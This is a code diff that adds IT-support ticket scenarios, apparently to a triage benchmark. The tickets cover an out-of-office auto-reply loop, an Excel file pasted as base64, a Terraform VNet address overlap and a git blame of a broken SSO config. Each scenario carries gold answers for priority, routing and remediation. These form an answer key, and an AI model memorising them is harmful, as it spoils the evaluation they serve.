+            "Subject: RE: Automatic reply: Out of Office\n\n"
+            "Thank you for contacting IT Support. Your ticket has been"
+            " received. Reference: INC-003848.\n\n"
+            "--- Original Message ---\n"
+            "From: anna.kovacs@contoso.com\n"
+            "Subject: Automatic reply: Out of Office\n\n"
+            "I am currently out of the office with limited access to"
+            " email. I will return on June 2.\n\n"
+            "[... 47 more auto-reply exchanges omitted ...]\n\n"
+            "This loop has generated 52 tickets so far.",
+            "An auto-reply loop between anna.kovacs@contoso.com (OOO"
+            " responder) and no-reply@contoso.com (ticket system"
+            " acknowledgment) has created 52 duplicate tickets. Each"
+            " OOO reply triggers a new ticket ack, which triggers"
+            " another OOO reply. The chain is still active.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+            needs_escalation=False,
+            missing_information=(
+                "configuration_details",
+                "affected_system",
+            ),
+            next_best_action=(
+                "Break the auto-reply loop between the OOO"
+                " responder and the ticketing system's no-reply"
+                " address — then bulk-close the 52 duplicate"
+                " tickets"
+            ),
+            remediation_steps=(
+                "Identify the auto-reply loop by detecting the"
+                " repeating pattern of OOO and ticket-ack"
+                " messages in the thread",
+                "Suppress further auto-replies from"
+                " anna.kovacs@contoso.com to no-reply@contoso.com"
+                " by adding a transport rule or adjusting the"
+                " OOO responder to skip no-reply addresses",
+                "Bulk-close the 52 duplicate tickets generated"
+                " by the loop with a note explaining the root"
+                " cause",
+                "Configure the ticketing system to not send"
+                " acknowledgment emails to addresses matching"
+                " known OOO or auto-reply patterns",
+            ),
+        ),
+        tags=("data-cleanup", "auto-reply-loop"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-094  Base64-encoded Excel spreadsheet as body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-094",
+        subjects=(
+            "Procurement spreadsheet issue — data pasted as base64",
+            "Excel file won't open — raw data below",
+        ),
+        descriptions=(
+            "I can't open the procurement tracker Excel file. I'm pasting"
+            " the base64 contents here so you can look at it:\n\n"
+            "UEsDBBQAAAAIAGFiV1kAAAAAAAAAAAAAABIAHABbQ29udGVudF9U\n"
+            "eXBlc10ueG1sVVQJAAOKrGhniqxoZ3V4CwABBAAAAAAEAAAAAN0T\n"
+            "yU7DMBC9I/EPka+oTqmQEGrKggqnIlF6t5xJYuF4rJm08PeM0yKB\n"
+            "RAsHJM/y3jbjybg+G5OtzMIAhmMqsrOcCqUkOOPbMb0tz48uqMhI\n"
+            "9EZYcGpMTM+JhiiyOqYDIjJjRrmQiHqhA5FfybniPcZoRMq3UKv4\n"
+            "[... approximately 850 more lines of base64 omitted ...]\n"
+            "UEsFBgAAAAAJAAkAdgIAAGJLAAAAAA==\n\n"
+            "The file is the Q2 2025 procurement tracker. When I double-"
+            "click it I get 'Excel cannot open the file because the file"
+            " format or extension is not valid.' It's supposed to be an"
+            " .xlsx file. About 450 rows of purchase orders. Running"
+            " Excel 365 on Windows 11.",
+            "The Q2 procurement tracker (450 rows of POs) won't open in"
+            " Excel — 'file format or extension is not valid' error."
+            " Someone pasted the raw base64 of the .xlsx file into the"
+            " ticket body instead of attaching it. Excel 365, Win11.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+            needs_escalation=False,
+            missing_information=(
+                "error_message",
+                "application_version",
+                "screenshot_or_attachment",
+            ),
+            next_best_action=(
+                "Investigate the corrupted Excel file — the"
+                " base64-encoded .xlsx data pasted into the"
+                " ticket body cannot be processed inline and the"
+                " user needs help recovering the procurement"
+                " tracker"
+            ),
+            remediation_steps=(
+                "Ignore the base64 blob in the ticket body — it"
+                " is not usable for automated processing and may"
+                " be truncated",
+                "Ask the user to attach the original .xlsx file"
+                " directly to the ticket or upload it to"
+                " SharePoint",
+                "If the original file also fails to open, try"
+                " the Open and Repair feature in Excel (File >"
+                " Open > Browse > select file > Open dropdown >"
+                " Open and Repair)",
+                "Check whether the file was corrupted during"
+                " download or sync (e.g., OneDrive conflict) by"
+                " comparing the file size with a known-good"
+                " backup",
+            ),
+        ),
+        tags=("data-cleanup", "base64-excel"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-095  Terraform template pasted as ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-095",
+        subjects=(
+            "Terraform apply failing on prod VNet — HCL pasted",
+            "Infrastructure deployment error — Terraform config below",
+        ),
+        descriptions=(
+            "Our Terraform apply is failing on the production VNet"
+            " deployment. Here's the relevant config:\n\n"
+            'resource "azurerm_virtual_network" "prod_vnet" {\n'
+            '  name                = "vnet-prod-eastus2-001"\n'
+            '  location            = azurerm_resource_group.prod.location\n'
+            '  resource_group_name = azurerm_resource_group.prod.name\n'
+            '  address_space       = ["10.100.0.0/16"]\n\n'
+            "  tags = {\n"
+            '    Environment = "Production"\n'
+            '    ManagedBy   = "Terraform"\n'
+            '    CostCenter  = "CC-4400"\n'
+            "  }\n"
+            "}\n\n"
+            'resource "azurerm_subnet" "app_subnet" {\n'
+            '  name                 = "snet-app-prod-001"\n'
+            "  resource_group_name  ="
+            " azurerm_resource_group.prod.name\n"
+            "  virtual_network_name ="
+            " azurerm_virtual_network.prod_vnet.name\n"
+            '  address_prefixes     = ["10.100.1.0/24"]\n\n'
+            "  delegation {\n"
+            '    name = "app-service-delegation"\n'
+            "    service_delegation {\n"
+            '      name = "Microsoft.Web/serverFarms"\n'
+            "      actions = [\n"
+            '        "Microsoft.Network/virtualNetworks/subnets/action"\n'
+            "      ]\n"
+            "    }\n"
+            "  }\n"
+            "}\n\n"
+            "Error: creating/updating Virtual Network"
+            " (Subscription: \"xxxx-xxxx\" / Resource Group:"
+            " \"rg-prod-eastus2\" / Name: \"vnet-prod-eastus2-001\"):"
+            " network.VirtualNetworksClient#CreateOrUpdate: The"
+            " address space '10.100.0.0/16' overlaps with existing"
+            " VNet 'vnet-legacy-eastus2' address space"
+            " '10.100.0.0/20'.\n\n"
+            "We need to deploy this by EOD for the new microservices"
+            " migration.",
+            "Terraform deployment for the production VNet in eastus2 is"
+            " failing with an address space overlap: 10.100.0.0/16"
+            " conflicts with the legacy VNet 10.100.0.0/20. The full HCL"
+            " config and error output were pasted into the ticket. Need"
+            " this resolved by EOD for the microservices migration.",
+        ),
+        gold=ScenarioGold(
+            category="Network & Connectivity",
+            priority="P2",
+            assigned_team="Network Operations",
+            needs_escalation=False,
+            missing_information=(
+                "configuration_details",
+                "environment_details",
+            ),
+            next_best_action=(
+                "Resolve the VNet address space overlap between"
+                " the new 10.100.0.0/16 and the legacy"
+                " 10.100.0.0/20 in eastus2 so the Terraform"
+                " deployment can proceed"
+            ),
+            remediation_steps=(
+                "Parse the Terraform HCL and error output to"
+                " identify the conflict: the new VNet's"
+                " 10.100.0.0/16 CIDR fully contains the legacy"
+                " VNet's 10.100.0.0/20",
+                "Coordinate with the network team to either"
+                " re-IP the new VNet to a non-overlapping range"
+                " (e.g., 10.101.0.0/16) or migrate the legacy"
+                " VNet",
+                "Update the Terraform address_space and subnet"
+                " address_prefixes to use the new non-overlapping"
+                " CIDR block",
+                "Re-run terraform plan to confirm no further"
+                " conflicts, then terraform apply to complete"
+                " the deployment before EOD",
+            ),
+        ),
+        tags=("data-cleanup", "terraform-template"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-096  Git blame output pasted as ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-096",
+        subjects=(
+            "Who changed the auth config? — git blame output",
+            "Production auth broken after config change — git blame",
+        ),
+        descriptions=(
+            "Production SSO broke this morning. I ran git blame on the"
+            " auth config to find who changed it:\n\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  1)"
+            " # auth-config.yaml\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  2)"
+            " sso:\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  3)"
+            "   provider: azure-ad\n"
+            "e5f6g7h8 (Bob Martinez   2025-05-19 23:47:11 -0400  4)"
+            "   tenant_id: \"NEW-TENANT-ID-9999\"\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  5)"
+            "   client_id: \"app-client-id-1234\"\n"
+            "e5f6g7h8 (Bob Martinez   2025-05-19 23:47:11 -0400  6)"
+            "   redirect_uri: \"https://staging.contoso.com/callback\"\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  7)"
+            "   scopes:\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  8)"
+            "     - openid\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400  9)"
+            "     - profile\n"
+            "e5f6g7h8 (Bob Martinez   2025-05-19 23:47:11 -0400 10)"
+            "     - offline_access\n"
+            "a1b2c3d4 (Alice Tanaka   2025-05-15 09:12:03 -0400 11)"
+            "   session_timeout: 3600\n\n"
+            "It looks like Bob Martinez changed the tenant_id and"
+            " redirect_uri to staging values at 23:47 last night"
+            " (commit e5f6g7h8). That's almost certainly why SSO is"
+            " broken for everyone this morning — production is pointing"
+            " at the staging Azure AD tenant and the callback URL is"
+            " wrong. About 800 employees cannot log in.",
+            "SSO is broken for ~800 employees. Git blame of"
+            " auth-config.yaml shows Bob Martinez (commit e5f6g7h8)"
+            " changed tenant_id and redirect_uri to staging values"
+            " at 23:47 last night. The full blame output is pasted in"
+            " the ticket. Need an immediate revert.",
+        ),
+        gold=ScenarioGold(
+            category="Access & Authentication",
+            priority="P1",
+            assigned_team="Identity & Access Management",
+            needs_escalation=True,
+            missing_information=(
+                "affected_users",
+                "environment_details",
+            ),
+            next_best_action=(
+                "Revert commit e5f6g7h8 that changed the"
+                " production auth-config.yaml to staging values"
+                " — SSO is broken for approximately 800"
+                " employees"
+            ),
+            remediation_steps=(
+                "Parse the git blame output to identify the"
+                " breaking changes: commit e5f6g7h8 by Bob"
+                " Martinez changed tenant_id and redirect_uri"
+                " to staging values",
+                "Immediately revert commit e5f6g7h8 or deploy a"
+                " hotfix restoring the production tenant_id and"
+                " redirect_uri in auth-config.yaml",
+                "Verify SSO login works by testing with a sample"
+                " account after the revert is deployed to"
+                " production",
+                "Investigate how a staging configuration change"
+                " reached the production branch — review the"
+                " CI/CD pipeline and branch protection rules",
+                "Communicate resolution to the ~800 affected"
+                " employees and advise them to retry login",
+            ),
+        ),
+        tags=("data-cleanup", "git-blame-output"),
+    ),
 ]
